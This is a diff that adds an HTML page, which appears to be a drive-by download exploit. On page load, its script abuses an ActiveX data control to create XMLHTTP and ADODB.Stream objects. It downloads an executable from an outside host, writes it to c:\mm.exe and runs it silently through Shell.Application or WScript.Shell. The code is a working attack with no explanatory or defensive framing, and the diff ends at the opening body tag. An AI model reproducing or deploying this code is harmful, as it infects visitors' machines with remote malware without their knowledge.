@@ -1,0 +1,37 @@
+<html><head>
+<script language="Javascript">
+function do1(mx,as,p)
+{
+	mx.Send();
+	as.Type = 1;
+	as.Open();
+	as.Write(mx.responseBody);
+	as.SaveToFile(p,2);
+	as.Close();
+}
+var a = null;
+var mx,as,p;
+p = "c:\\mm.exe"
+a = (document.createElement("object"));
+a.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+try{mx = a.CreateObject("Microsoft.XMLHTTP","");}catch(e){};
+if(!mx)try{mx = new ActiveXObject("Microsoft.XMLHTTP");}catch(e){};
+try{as = a.CreateObject("Adodb.Stream","");}catch(e){};
+if(as){
+	mx.Open("GET","http://www.hackerfly.org/ceshi.exe",0);
+	do1(mx,as,p);
+	var r;
+	try{r = a.CreateObject("Shell.Application","");}catch(e){};
+	if(r)
+	{
+		r.ShellExecute(p,"","","open",0);
+	}else
+	{
+		try{r = a.CreateObject("WScript.Shell","");}catch(e){};
+		if(r)r.Run(p,0);
+	}
+}
+
+</script>
+</head>
+<body>
